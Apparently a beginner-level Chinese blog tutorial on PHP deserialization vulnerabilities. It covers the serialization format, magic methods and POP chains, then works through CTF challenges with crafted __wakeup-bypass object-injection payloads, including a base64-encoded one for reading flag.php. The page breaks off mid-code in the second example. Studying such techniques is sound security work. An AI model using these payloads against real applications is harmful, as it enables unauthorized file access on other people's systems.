<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><title>PHP反序列化总结(一)-小白文 | xiaoZ's Blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.4.0/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"><meta name="generator" content="Hexo 4.1.1"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">PHP反序列化总结(一)-小白文</h1><a id="logo" href="/.">xiaoZ's Blog</a><p class="description">Try My Best</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> Home</i></a><a href="/archives/"><i class="fa fa-archive"> Archive</i></a><a href="/about/"><i class="fa fa-user"> About</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">PHP反序列化总结(一)-小白文</h1><div class="post-meta">Sep 23, 2019<span> | </span><span class="category"><a href="/categories/Web%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D/">Web漏洞介绍</a></span></div><a class="disqus-comment-count" data-disqus-identifier="2019/09/23/PHP反序列化总结(一)-小白文/" href="/2019/09/23/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93(%E4%B8%80)-%E5%B0%8F%E7%99%BD%E6%96%87/#disqus_thread"></a><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">Contents</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#序列化与反序列化"><span class="toc-number">1.</span> <span class="toc-text">序列化与反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP序列化"><span class="toc-number">2.</span> <span class="toc-text">PHP序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP反序列化"><span class="toc-number">3.</span> <span class="toc-text">PHP反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP反序列化漏洞与魔法函数"><span class="toc-number">4.</span> <span class="toc-text">PHP反序列化漏洞与魔法函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#construct-destruct"><span class="toc-number">4.1.</span> <span class="toc-text">construct(), destruct()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#call-callStatic"><span class="toc-number">4.2.</span> <span class="toc-text">call(), callStatic()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-set"><span class="toc-number">4.3.</span> <span class="toc-text">get(), set()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#isset-unset"><span class="toc-number">4.4.</span> <span class="toc-text">isset(), unset()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sleep-wakeup"><span class="toc-number">4.5.</span> <span class="toc-text">sleep(), wakeup()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#toString"><span class="toc-number">4.6.</span> <span class="toc-text">__toString()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#invoke"><span class="toc-number">4.7.</span> <span class="toc-text">__invoke()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#set-state"><span class="toc-number">4.8.</span> <span class="toc-text">__set_state()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#clone"><span class="toc-number">4.9.</span> <span class="toc-text">__clone()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#debugInfo"><span class="toc-number">4.10.</span> <span class="toc-text">__debugInfo()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP反序列化与POP链"><span class="toc-number">5.</span> <span class="toc-text">PHP反序列化与POP链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP反序列化示例"><span class="toc-number">6.</span> <span class="toc-text">PHP反序列化示例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#示例一"><span class="toc-number">6.1.</span> <span class="toc-text">示例一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#示例二"><span class="toc-number">6.2.</span> <span class="toc-text">示例二</span></a></li></ol></li></ol></div></div><div class="post-content"><p>接之前写的关于SSRF漏洞的介绍，之前写完SSRF篇，激起了自己想把这些漏洞都系统性总结下的兴趣，后续会对于一些其他的漏洞也进行一些介绍，这个系列的更偏向于对于没有基础或者基础较弱的人的科普。更加深入的东西，会在一些其他wp或博客中进行介绍。另外，这一篇博客中不涉及对session序列化、phar伪协议触发PHP反序列化等的介绍，将会在第二部分中进行总结。</p>
<h2 id="序列化与反序列化">序列化与反序列化</h2>
<p>来自维基：在计算机科学的数据处理中，序列化是指将数据结构或对象状态转换成可取用格式（例如存成文件，存于缓冲，或经由网络中发送），以留待后续在相同或另一台计算机环境中，能恢复原先状态的过程。依照序列化格式重新获取字节的结果时，可以利用它来产生与原始对象相同语义的副本。对于许多对象，像是使用大量引用的复杂对象，这种序列化重建的过程并不容易。面向对象中的对象序列化，并不概括之前原始对象所关系的函数。这种过程也称为对象编组（marshalling）。从一系列字节提取数据结构的反向操作，是反序列化（也称为解编组、deserialization、unmarshalling）。</p>
<p>序列化在计算机科学中通常有以下定义：<br>
对同步控制而言，表示强制在同一时间内进行单一访问。<br>
在数据储存与发送的部分是指将一个对象存储至一个存储介质，例如文件或是存储器缓冲等，或者透过网络发送数据时进行编码的过程，可以是字节或是XML等格式。而字节的或XML编码格式可以还原完全相等的对象。这程序被应用在不同应用程序之间发送对象，以及服务器将对象存储到文件或数据库。相反的过程又称为反序列化。</p>
<p>另一个比较重要的概念为序列化协议，在编程语言中，变量和实例对应的，是一些有意义的数据。这些数据，在不同编程语言中，可能有不一样的表现；在不同操作系统中，也可能有不一样的形式。现代计算机应用，不可避免地会涉及到多个模块/程序之间的数据交换、不同语言之间的相互协作、计算机之间的数据交互。如果依着操作系统和编程语言的特性，用不同的形式去实现同样的数据，那整个计算机世界就会乱了套了。</p>
<p>数据的序列化和反序列化，就是为了解决这个问题而诞生的。</p>
<p>序列化是说，将变量和实例这些数据，依照某种约定，转化（通常伴随着压缩）为一种通用的数据格式；转化后的数据，可以用来储存或者传输，以备下次读取使用。其中提到的格式可以是二进制的，也可以是字符串式的。反序列化，就是上述过程的补集：将序列化的数据读入，解析为编程语言可识别的数据结构的过程。</p>
<p>通俗的来说，序列化的意思就是将编程中的数据结构或者对象（类）通过某种方法将其转化为另外一种有特殊格式的字符串，这种字符串可以用来进行重建转化前的数据结构或对象。在这里面，转化的方法就叫做序列化，而将转化之后的特殊格式的字符串还原的操作叫做反序列化。目前很多编程语言都支持序列化，如C/C++、Java、Perl、PHP、Python、Delphi、OCaml等，本文主要介绍PHP中的序列化与反序列化，这也是在做CTF Web题中较常碰见的问题。</p>
<h2 id="PHP序列化">PHP序列化</h2>
<p>这里先对PHP中的序列化进行介绍，其余编程语言的大体上是类似的形式，只是实现方式上大同小异。<br>
之前说过，序列化其实就是将对象转为字符串，那么先看看PHP中的类的格式：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> 				//类定义</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag = <span class="string">'xiaoZisacaiji'</span>;</span><br><span class="line">    <span class="keyword">protected</span> $test1 = <span class="string">'test1'</span>;</span><br><span class="line">    <span class="keyword">public</span> $test2 = <span class="string">'test2'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set_flag</span><span class="params">($flag)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;flag = $flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$object = <span class="keyword">new</span> test();	<span class="comment">//实例化类</span></span><br><span class="line">$object-&gt;set_flag(<span class="string">'xiaoZxiaoZ'</span>);	<span class="comment">//对flag进行复制</span></span><br><span class="line"><span class="comment">// echo $object;</span></span><br><span class="line">$result = serialize($object);		<span class="comment">//将对象进行序列化</span></span><br><span class="line"><span class="keyword">echo</span> $result;						<span class="comment">//打印结果</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="comment">// echo $object 直接打印对象 明显是会报错的</span></span><br><span class="line"><span class="selector-tag">Recoverable</span> <span class="selector-tag">fatal</span> <span class="selector-tag">error</span>: <span class="selector-tag">Object</span> <span class="selector-tag">of</span> <span class="selector-tag">class</span> <span class="selector-tag">test</span> <span class="selector-tag">could</span> <span class="selector-tag">not</span> <span class="selector-tag">be</span> <span class="selector-tag">converted</span> <span class="selector-tag">to</span> <span class="selector-tag">string</span> <span class="selector-tag">in</span> <span class="selector-tag">E</span>:\<span class="selector-tag">test</span>\<span class="selector-tag">index</span><span class="selector-class">.php</span> <span class="selector-tag">on</span> <span class="selector-tag">line</span> <span class="selector-tag">18</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化成字符串后打印结果</span></span><br><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:4</span><span class="selector-pseudo">:"test"</span><span class="selector-pseudo">:3</span>:&#123;<span class="attribute">s</span>:<span class="number">10</span>:<span class="string">"testflag"</span>;<span class="attribute">s</span>:<span class="number">10</span>:<span class="string">"xiaoZxiaoZ"</span>;<span class="attribute">s</span>:<span class="number">8</span>:<span class="string">"*test1"</span>;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"test1"</span>;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"test2"</span>;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"test2"</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到序列化后的结果和json数据格式有点类似，下面对上述序列化后的字符串进行解释：</p>
<ul>
<li>
<p>括号外面<br>
O:4:“test”:3:<br>
O表示这是一个对象<br>
4便是对象名的字符长度，这里的是test，长度为4<br>
'test’为对象名<br>
3表示该对象中有三个属性，即类中定义了三个变量</p>
</li>
<li>
<p>括号里面<br>
可以看到是有一定格式的，其中 s:10:“testflag”;s:10:“xiaoZxiaoZ”; 为一组<br>
前面的s:10:“testflag”;为属性名，后面为属性值<br>
对于每一个部分，都是由类型+长度+值来表示。<br>
如 s:10:“testflag”; 中 s 为数据类型，10为长度<br>
需要注意，这里testflag虽然是8个字符，但是在PHP序列化中，对于私有属性，序列化时会在前面补上两个空字符，所以这里的长度为10，后面即为值。<br>
而后续的 s:10:“xiaoZxiaoZ”; 即是属性值，格式一样，和前一部分连起来表示属性名为testflag的变量的值为xiaoZxiaoZ。</p>
</li>
</ul>
<p>括号里面其他部分就是类似的了，另外这里又有一个需要注意的点就是，对于pritected权限的test，在PHP序列化之后为’*test1’，字符长度也变为了8，这也是需要注意的一个点，在PHP序列化中，对于对象中的protected属性，需要在前面加上两个空白符和*。</p>
<p>另外，需要注意，序列化结果中并没有方法，即在对对象进行序列化时，只对属性进行序列化，方法是不用进行序列化的。在PHP序列化中，其涉及的字符如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a - <span class="keyword">array</span></span><br><span class="line">b - boolean</span><br><span class="line">d - double</span><br><span class="line">i - integer</span><br><span class="line">o - common object</span><br><span class="line">r - reference</span><br><span class="line">s - string</span><br><span class="line">C - custom object</span><br><span class="line">O - <span class="class"><span class="keyword">class</span></span></span><br><span class="line"><span class="class"><span class="title">N</span> - <span class="title">null</span></span></span><br><span class="line"><span class="class"><span class="title">R</span> - <span class="title">pointer</span> <span class="title">reference</span></span></span><br><span class="line"><span class="class"><span class="title">U</span> - <span class="title">unicode</span> <span class="title">string</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">N</span> 表示的是<span class="title">NULL</span>，而<span class="title">b</span>、<span class="title">d</span>、<span class="title">i</span>、<span class="title">s</span> 表示的是四种标量类型，目前其它语言所实现的<span class="title">PHP</span>序列化程序</span></span><br><span class="line"><span class="class">基本上都实现了对这些类型的序列化和反序列化，不过有一些实现中对<span class="title">s</span> （字符串）的实现存在问题。</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">a</span>、<span class="title">O</span> 属于最常用的复合类型，大部分其他语言的实现都很好的实现了对<span class="title">a</span> 的序列化和反序列化，</span></span><br><span class="line"><span class="class">但对<span class="title">O</span> 只实现了<span class="title">PHP4</span> 中对象序列化格式，而没有提供对<span class="title">PHP</span> 5 中扩展的对象序列化格式的支持。</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">r</span>、<span class="title">R</span> 分别表示对象引用和指针引用，这两个也比较有用，在序列化比较复杂的数组和对象时</span></span><br><span class="line"><span class="class">就会产生带有这两个标示的数据，目前这两个标示尚没有发现有其他语言的实现。</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">C</span> 是<span class="title">PHP5</span> 中引入的，它表示自定义的对象序列化方式，尽管这对于其它语言来说是没有必要实现的。</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">U</span> 是<span class="title">PHP6</span> 中才引入的，它表示<span class="title">Unicode</span> 编码的字符串。因为<span class="title">PHP6</span> 中提供了<span class="title">Unicode</span> 方式保存字符串的能力，</span></span><br><span class="line"><span class="class">因此它提供了这种序列化字符串的格式，不过这个类型<span class="title">PHP5</span>、<span class="title">PHP4</span> 都不支持，而这两个版本目前是主流，因此在其它语言实现该类型时，</span></span><br><span class="line"><span class="class">不推荐用它来进行序列化，不过可以实现它的反序列化过程。</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">最后还有一个<span class="title">o</span>，这个标示在<span class="title">PHP3</span> 中被引入用来序列化对象，但是到了<span class="title">PHP4</span> 以后就被<span class="title">O</span> 取代了。</span></span><br><span class="line"><span class="class">在<span class="title">PHP3</span> 的源代码中可以看到对<span class="title">o</span> 的序列化和反序列化与数组<span class="title">a</span>基本上是一样的。但是在<span class="title">PHP4</span>、<span class="title">PHP5</span> 和<span class="title">PHP6</span></span></span><br><span class="line"><span class="class">的源代码中序列化部分里都找不到它的影子，但是在这几个版本的反序列化程序源代码中却都有对它的处理。</span></span><br></pre></td></tr></table></figure>
<h2 id="PHP反序列化">PHP反序列化</h2>
<p>有了上一部分的介绍，这一部分会简单很多，反序列化则是将字符串还原为对象，在PHP中，其函数为unserialize()，可以看到下面的示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> 				//类定义</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag = <span class="string">'xiaoZisacaiji'</span>;</span><br><span class="line">    <span class="keyword">protected</span> $test1 = <span class="string">'test1'</span>;</span><br><span class="line">    <span class="keyword">public</span> $test2 = <span class="string">'test2'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set_flag</span><span class="params">($flag)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;flag = $flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data = file_get_contents(<span class="string">"re.txt"</span>); <span class="comment">//序列化结果存储在re.txt</span></span><br><span class="line"></span><br><span class="line">$data = unserialize($data);</span><br><span class="line"><span class="keyword">echo</span> $data-&gt;test1;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $data-&gt;get_flag();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>上述代码运行后结果为：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">test2</span><br><span class="line">xiaoZxiaoZ</span><br></pre></td></tr></table></figure>
<p>其实就是还原，这里倒是没什么要说的，但是这里有一点值得提一下的是 ，反序列化得到的对象一般是程序可能会用到的，那么如果可以在反序列化时将其中的某个属性值改成自己想要的值，是否可以达成一些其他目的呢？这其实便是一些ctf web题中场景的反序列化漏洞利用原理。</p>
<h2 id="PHP反序列化漏洞与魔法函数">PHP反序列化漏洞与魔法函数</h2>
<p>上面已经举了些例子对PHP序列化与反序列化进行了介绍，下面对PHP反序列化的漏洞进行介绍，归根到底，这些漏洞的根本原理在于，通过利用PHP反序列化相关函数中的一些漏洞，改变反序列化结果中对象的属性值，从而实现最终的攻击。常涉及到的函数有以下这些，通过利用这些函数的一些特性或漏洞即可进行反序列化对象注入，修改对象的属性值：</p>
<h3 id="construct-destruct">construct(), destruct()</h3>
<p>构造函数与析构函数，前者创建对象时调用，后者销毁对象时调用。</p>
<h3 id="call-callStatic">call(), callStatic()</h3>
<p>方法重载的两个函数<br>
__call()是在对象上下文中调用不可访问的方法时触发。<br>
__callStatic()是在静态上下文中调用不可访问的方法时触发。</p>
<h3 id="get-set">get(), set()</h3>
<p>__get()用于从不可访问的属性读取数据，当给不可访问或不存在属性赋值时被调用。<br>
__set()用于将数据写入不可访问的属性，读取不可访问或不存在属性时被调用。</p>
<h3 id="isset-unset">isset(), unset()</h3>
<p>__isset()在不可访问的属性上调用isset()或empty()触发。<br>
__unset()在不可访问的属性上使用unset()时触发。</p>
<h3 id="sleep-wakeup">sleep(), wakeup()</h3>
<p>serialize()检查类是否具有魔术名sleep()的函数。如果有，该函数在任何序列化之前执行。它可以清理对象，并且应该返回一个数组，其中应该被序列化的对象的所有变量的名称。如果该方法不返回任何内容，则将NULL序列化并发出E_NOTICE。sleep()的预期用途是提交挂起的数据或执行类似的清理任务。此外，如果您有非常大的对象，不需要完全保存，该功能将非常有用。<br>
unserialize()使用魔术名wakeup()检查函数的存在。如果存在，该功能可以重构对象可能具有的任何资源。wakeup()的预期用途是重新建立在序列化期间可能已丢失的任何数据库连接，并执行其他重新初始化任务。</p>
<h3 id="toString">__toString()</h3>
<p>这个函数在反序列化中，触发条件比较多，因为这个也常被忽略，常见的触发方式有：</p>
<ul>
<li>echo ($obj) / print($obj) 打印时会触发</li>
<li>反序列化对象与字符串连接时</li>
<li>反序列化对象参与格式化字符串时</li>
<li>反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型）</li>
<li>反序列化对象参与格式化SQL语句，绑定参数时</li>
<li>反序列化对象在经过php字符串函数，如 strlen()、addslashes()时</li>
<li>在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回的字符串的时候toString会被调用</li>
<li>反序列化的对象作为 class_exists() 的参数的时候</li>
</ul>
<h3 id="invoke">__invoke()</h3>
<p>当脚本尝试将对象调用为函数时，调用__invoke()方法。</p>
<h3 id="set-state">__set_state()</h3>
<p>当调用var_export()导出类时，此静态方法被调用。用__set_state的返回值做为var_export的返回值。</p>
<h3 id="clone">__clone()</h3>
<p>进行对象clone时被调用，用来调整对象的克隆行为。</p>
<h3 id="debugInfo">__debugInfo()</h3>
<p>当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5.6版本。</p>
<p>这些函数也叫做魔法函数，后面会结合例子对一些较为常见的魔法函数进行介绍。</p>
<h2 id="PHP反序列化与POP链">PHP反序列化与POP链</h2>
<p>在介绍这些魔法函数的细节前，先了解一个概念——POP链。<br>
就如前文所说，当反序列化参数可控时，可能会产生严重的安全威胁。<br>
面向对象编程从一定程度上来说，就是完成类与类之间的调用。就像ROP一样，POP链起于一些小的&quot;组件&quot;，这些小&quot;组件&quot;可以调用其他的&quot;组件&quot;。在PHP中，&quot;组件&quot;就是这些魔术方法( 比如__wakeup()或__destruct() )。</p>
<p>一些对我们来说有用的POP链方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//命令执行</span></span><br><span class="line">exec()</span><br><span class="line">passthru()</span><br><span class="line">popen()</span><br><span class="line">system()</span><br><span class="line"></span><br><span class="line"><span class="comment">//文件操作</span></span><br><span class="line">file_put_contents()</span><br><span class="line">file_get_contents()</span><br><span class="line">unlink()</span><br></pre></td></tr></table></figure>
<p>在反序列化漏洞的利用中，其实便是需要我们去构造POP链，将需要传入的参数传到对象属性中，从而达到读取文件或执行命令的目的。<br>
如下面这样的代码（来源XCTF 攻防世界 web进阶 unserialize3）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123; </span><br><span class="line"><span class="keyword">public</span> $flag = <span class="string">'111'</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure>
<p>这里的反序列化利用比较简单，只需要利用wakeup进行绕过将flag传入即可。这里利用了PHP中的魔法函数_wakeup(),__wakeup()函数漏洞与对象的属性个数有关，如果序列化后的字符串中表示属性个数的数字与真实属性个数一致，那么就调用__wakeup()函数，如果该数字大于真实属性个数，就会绕过__wakeup()函数。所以绕过payload:O:4:“sctf”:2:{s:4:“flag”;s:3:“111”;}</p>
<p>上面这个对于理解POP链可能帮助并不大，下面看这个例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">popdemo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $data = <span class="string">"demon"</span>;</span><br><span class="line">    <span class="keyword">private</span> $filename = <span class="string">'./demo'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;save(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($filename)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        file_put_contents($filename, <span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这就是一个比较简单的POP链，攻击者需要做的是通过利用_wakeup()魔法函数，将需要读取的文件名传入到反序列化后的对象中，从而实现读取文件的目的。这里使用的poc不直接给出，可以自行尝试。</p>
<h2 id="PHP反序列化示例">PHP反序列化示例</h2>
<p>这里的示例，结合两个CTF题目进行介绍，希望对于通过对于这些示例的介绍，能够都PHP序列化与反序列化有一个更为清晰的理解。</p>
<h3 id="示例一">示例一</h3>
<p>先看题目源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123; </span><br><span class="line">    <span class="keyword">protected</span> $file=<span class="string">'index.php'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123; </span><br><span class="line">      	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">       	<span class="keyword">if</span>(strchr(<span class="keyword">$this</span>-&gt; file,<span class="string">"\\"</span>)===<span class="keyword">false</span> &amp;&amp;  strchr(<span class="keyword">$this</span>-&gt;file, <span class="string">'/'</span>)===<span class="keyword">false</span>)</span><br><span class="line">          	show_source(dirname (<span class="keyword">__FILE__</span>).<span class="string">'/'</span>.<span class="keyword">$this</span> -&gt;file);</span><br><span class="line">       	<span class="keyword">else</span></span><br><span class="line">       		<span class="keyword">die</span>(<span class="string">'Wrong filename.'</span>);</span><br><span class="line">      	&#125;</span><br><span class="line">    &#125;  </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123; </span><br><span class="line">    	<span class="keyword">$this</span>-&gt; file=<span class="string">'index.php'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">    	<span class="keyword">return</span> <span class="string">''</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;     </span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123; </span><br><span class="line">	show_source(<span class="string">'index.php'</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">   	$file=base64_decode( $_GET[<span class="string">'file'</span>]); </span><br><span class="line">   	<span class="keyword">echo</span> unserialize($file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span>   </span><br><span class="line"><span class="comment">#&lt;!--key in flag.php--&gt;</span></span><br></pre></td></tr></table></figure>
<p>代码审计，要得到flag，思路如下：</p>
<ul>
<li>源码最后提示，KEY在flag.php里面；</li>
<li>注意到__destruct魔术方法中，有这么一段代码，将file文件内容显示出来<br>
show_source(dirname(FILE).’/‘.$this-&gt;file)，这个是解题关键；</li>
<li>若POST“file”参数为序列化对象，且将file设为flag.php；那么可以通过unserialize反序列化，进而调用__destruct魔术方法来显示flag.php源码（要注意的是file参数内容需要经过base64编码）；</li>
<li>另外，从代码分析可以知道，还有__wakeup这个拦路虎，通过unserialize反序列化之后，也会调用__wakeup方法，它会把file设为index.php；</li>
<li>总结下来就是，想办法把file设为flag.php，触发__destruct方法，且绕过__wakeup。</li>
</ul>
<p>这里的重点是绕过__wakeup，而这个方法是存在一个PHP反序列化对象注入漏洞的。简单来说，当序列化字符串中，如果表示对象属性个数的值大于实际属性个数时，那么就会跳过wakeup方法的执行。因此，可以构造payload，将其属性个数修改为比实际大，即可绕过该魔法函数。</p>
<p>这里构造payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">5</span>:<span class="string">"SoFun"</span>:<span class="number">2</span>:&#123;S:<span class="number">7</span>:<span class="string">"\00*\00file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//其中，O:5:"SoFun":2: 中的2本应该为1，这里为了绕过wakeup函数将其改为2</span></span><br><span class="line"><span class="comment">//另外，file是protected属性，因此需要用\00*\00来表示，\00代表ascii为0的值，即为空字符。</span></span><br><span class="line"><span class="comment">//另外，payload还需要经过Base64编码，最终的payload为：</span></span><br><span class="line"></span><br><span class="line">Tzo1OiJTb0Z1biI6Mjp7Uzo3OiJcMDAqXDAwZmlsZSI7czo4OiJmbGFnLnBocCI7fQ==</span><br></pre></td></tr></table></figure>
<h3 id="示例二">示例二</h3>
<p>本题来源–19年国赛。源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $handle;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span 